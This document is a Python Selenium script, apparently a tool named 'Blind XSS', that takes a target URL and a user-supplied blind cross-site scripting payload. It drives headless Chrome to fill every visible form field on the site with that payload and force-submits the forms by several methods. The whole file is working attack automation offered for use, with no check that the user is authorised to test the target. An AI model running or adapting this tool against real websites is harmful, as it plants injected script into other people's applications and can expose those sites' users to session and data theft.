import time
import os
from urllib.parse import urlparse
from colorama import Fore
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import (
    StaleElementReferenceException, NoSuchElementException
)
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def g_inputs(driver):
    elements = []
    
    elements.extend(driver.find_elements(By.TAG_NAME, "input"))
    elements.extend(driver.find_elements(By.TAG_NAME, "textarea"))
    elements.extend(driver.find_elements(By.TAG_NAME, "select"))
    elements.extend(driver.find_elements(By.XPATH, "//*[@contenteditable='true']"))

    filtered = []
    for el in elements:
        try:
            if not el.is_displayed() or not el.is_enabled():
                continue
            filtered.append(el)
            
        except StaleElementReferenceException:
            continue
    return filtered

def value(el, payload):
    el.click()
    el.clear()
    el.send_keys(payload)
    el.send_keys(Keys.TAB)
    return True

def submit(driver, el):
    el.send_keys(Keys.ENTER)
    time.sleep(0.5)


    driver.execute_script("if(arguments[0].form) { arguments[0].form.submit(); return true; } return false; ", el)
    
    time.sleep(0.4)

    form = driver.execute_script("return arguments[0].form || arguments[0].closest('form');", el)
    if form:
        clicked = driver.execute_script("""
            var f = arguments[0];
            if(!f) return false;
            var candidates = f.querySelectorAll("button[type='submit'], input[type='submit'], button");
            for(var i=0;i<candidates.length;i++){
                var b = candidates[i];
                if(!b.disabled){ b.click(); return true; }
            }
            return false;
        """, form)
        if clicked:
            time.sleep(0.5)

def snapshot(driver):
    return {
        "url": driver.current_url,
        "title": driver.title,
        "snippet": driver.page_source[:1000]
    }

def main():
    cls()
    print(Fore.BLUE + rf"""
__________.__  .__            .___ ____  ___  _________ _________
\______   \  | |__| ____    __| _/ \   \/  / /   _____//   _____/
 |    |  _/  | |  |/    \  / __ |   \     /  \_____  \ \_____  \ 
 |    |   \  |_|  |   |  \/ /_/ |   /     \  /        \/        \
 |______  /____/__|___|  /\____ |  /___/\  \/_______  /_______  /
        \/             \/      \/        \_/        \/        \/ 

made by @hghost010
""")
    
    try:
        target_url = input(Fore.CYAN + "\nEnter the target URL: " + Fore.YELLOW)
        if not target_url.startswith("http"):
            target_url = "https://" + target_url

        payload = input(Fore.CYAN + "Enter your blind XSS payload: " + Fore.YELLOW)

        print(Fore.GREEN + "Starting..." + Fore.MAGENTA)
        
    except KeyboardInterrupt:
        print(Fore.RED + "Exiting" + Fore.RESET)
        return
    
    timeout = 0.6
    
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-extensions")
    opts.add_argument("--disable-browser-side-navigation")
    opts.add_argument("--disable-infobars")
    opts.add_argument("--disable-notifications")
    opts.add_argument("--window-size=1920,1080")

    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(30)

    try:
        print(Fore.MAGENTA + "Opening:", target_url)
        driver.get(target_url)
        time.sleep(timeout)

        index = 0
        results = []

        while True:
            inputs = g_inputs(driver)
            if not inputs:
                print(Fore.YELLOW + "No inputs found, finishing.")
                break

            for el in inputs:
                index += 1
                try:
                    attrs = driver.execute_script("""
                        var e = arguments[0];
                        return {
                            tag: e.tagName,
                            type: e.type || null,
                            id: e.id || null,
                            name: e.name || null,
                            outer: e.outerHTML.slice(0,200)
                        };
                    """, el)

                    injected = value(el, payload)
                    submit(driver, el)

                    snap = snapshot(driver)
                    results.append({
                        "index": index,
                        "attrs": attrs,
                        "injection_set": injected,
                        "snapshot": {"url": snap["url"], "title": snap["title"]}
                    })

                    if urlparse(snap["url"]).netloc != urlparse(target_url).netloc:
                        driver.get(target_url)
                        time.sleep(timeout)
                        break
                    else:
                        driver.refresh()
                        time.sleep(timeout)
                        break

                except StaleElementReferenceException:
                    continue
                except Exception as e:
                    print(Fore.RED + "[Error]", e)
                    continue

            if not g_inputs(driver):
                break

    except KeyboardInterrupt:
        print(Fore.RED + "Exiting..." + Fore.RESET)
        os._exit(1)
    finally:
        driver.quit()
        print(Fore.GREEN + "\n\nDone.. Thanks for using this tool!!!" + Fore.RESET)


if __name__ == "__main__":
    main()
    
